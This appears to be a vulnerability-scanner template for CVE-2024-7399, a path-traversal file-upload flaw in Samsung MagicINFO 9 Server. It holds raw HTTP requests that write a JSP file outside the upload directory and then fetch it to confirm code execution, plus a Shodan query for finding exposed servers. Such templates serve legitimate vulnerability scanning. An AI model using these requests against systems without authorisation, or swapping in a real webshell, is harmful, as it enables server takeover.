flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    status:
    - 200
    type: status
  raw:
  - "POST /MagicInfo/servlet/SWUpdateFileUploader?fileName=./../../../../../../server/{{filename}}.jsp&deviceType=abc&deviceModelName=test&swVer=123\
    \ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/plain\n\n<%@ page import=\"\
    java.util.Base64\" %>\n<%\nString base64Input = request.getParameter(\"input\"\
    );\nif (base64Input != null) {\n    byte[] decodedBytes = Base64.getDecoder().decode(base64Input);\n\
    \    out.print(new String(decodedBytes));\n}\n%>\n"
- matchers:
  - part: body
    type: word
    words:
    - '{{input}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /MagicInfo/{{filename}}.jsp?input={{urlencode(base64(input))}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-7399
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:samsung:magicinfo_9_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-7399
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-22
    epss-percentile: 0.98503
    epss-score: 0.67522
  description: 'Improper limitation of a pathname to a restricted directory vulnerability
    in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write
    arbitrary file as system authority.

    '
  impact: 'Authenticated attackers can exploit path traversal to write arbitrary JSP
    files with system privileges, achieving remote code execution and complete server
    compromise.

    '
  metadata:
    max-request: 1
    product: magicinfo_9_server
    shodan-query: 'Server: MagicInfo Premium Server'
    vendor: samsung
    verified: true
  name: Samsung MagicINFO 9 Server 21.1050.0 - Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-7399
  remediation: 'Update Samsung MagicINFO 9 Server to version 21.1050 or later to address
    the path traversal and arbitrary file write vulnerability.

    '
  severity: high
  tags: cve,cve2024,rce,magicinfo,samsung,file-upload,intrusive,vkev,vuln
variables:
  filename: '{{randbase(6)}}'
  input: '{{randstr}}'
